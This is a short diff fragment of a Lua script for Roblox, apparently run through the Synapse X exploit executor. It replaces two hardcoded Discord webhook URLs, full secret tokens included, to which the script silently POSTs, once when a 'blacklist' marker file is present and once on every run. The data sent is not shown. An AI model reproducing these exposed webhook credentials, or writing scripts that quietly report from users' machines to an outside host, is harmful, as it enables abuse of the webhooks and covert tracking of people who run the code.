@@ -52,7 +52,7 @@ end
 
 if isfile("123712091724.lua") then
 local HttpService = game:GetService("HttpService")
-local BlacklistWebhook_URL = "https://discord.com/api/webhooks/1089234141406564392/4A4jSbuiwV9W364MiUPwsI3TEDxmkCGSHdlhYk7X8xSDz64NZp2JZJLLHq8zfPZz_VNn"
+local BlacklistWebhook_URL = "https://discord.com/api/webhooks/1089241984813772846/YDtGc3QvlQJLQ0cA8-Mwq4u-wgSERPBIBUfn3ecOLpQKmpl-R_xwLKsm705xRPtzijAD"
     local response_blacklist = syn.request({
         Url = BlacklistWebhook_URL,
         Method = 'POST',
@@ -82,7 +82,7 @@ end
 
 local Toggle = true
 local HttpService = game:GetService("HttpService")
-local Webhook_URL = "https://discord.com/api/webhooks/1089234416011845632/Hom_xMh9lY_U8Ld0QF3CeC4UikPaQ5ZGxO5Ya6Cb2cd02x-DU-MN1ahHQr-py1EZWvWr"
+local Webhook_URL = "https://discord.com/api/webhooks/1089241992824885408/ik3e46MArT5JKGmEy1DQyRq7SCevxAN0khnqHFz90xdESRqyOzBLTEIyBgdnZNd0_3iI"
 
 local response = syn.request({
     Url = Webhook_URL,
